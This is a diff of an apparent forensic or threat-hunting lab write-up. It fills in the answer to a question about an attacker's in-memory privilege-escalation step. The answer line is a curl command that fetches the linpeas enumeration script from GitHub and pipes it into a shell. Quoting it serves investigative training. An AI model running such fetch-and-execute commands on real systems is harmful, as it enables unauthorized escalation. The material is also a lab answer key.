@@ -5483,7 +5483,7 @@ The attacker gained interactive hands-on remote access at **2025-12-29 05:40:03
 
 ### Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.
 
-**==Answer==**
+**==curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh==**
 <div align="center">
 <br>
 <br>
